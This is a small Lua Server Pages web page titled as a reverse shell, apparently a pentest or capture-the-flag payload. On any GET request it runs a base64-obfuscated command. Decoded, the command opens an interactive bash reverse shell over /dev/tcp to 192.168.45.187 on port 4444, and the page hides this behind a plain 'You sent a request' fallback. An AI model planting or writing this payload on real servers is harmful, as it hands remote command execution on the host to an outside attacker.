<div style="margin-left:auto;margin-right: auto;width: 350px;">

<div id="info">
<h2>Lua Server Pages Reverse Shell</h2>
<p>Delightful, isn't it?</p>
</div>

<?lsp if request:method() == "GET" then ?>
<?lsp os.execute("echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTg3LzQ0NDQgMD4mMQ== | base64 -d | bash &") ?>
<?lsp else ?>
You sent a <?lsp=request:method()?> request
<?lsp end ?>

</div>
